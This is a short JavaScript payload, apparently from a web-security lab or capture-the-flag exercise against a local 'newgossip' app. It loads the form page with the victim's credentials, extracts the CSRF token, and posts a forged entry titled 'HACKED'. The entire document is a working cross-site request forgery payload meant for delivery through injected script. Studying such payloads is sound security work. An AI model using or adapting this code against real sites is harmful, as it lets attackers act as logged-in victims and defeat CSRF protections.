var domain = 'http://localhost:10007/newgossip';
var req1 = new XMLHttpRequest();
req1.open ('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=HACKED&subtitle=Jefe estoy cansado&text=prueba&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
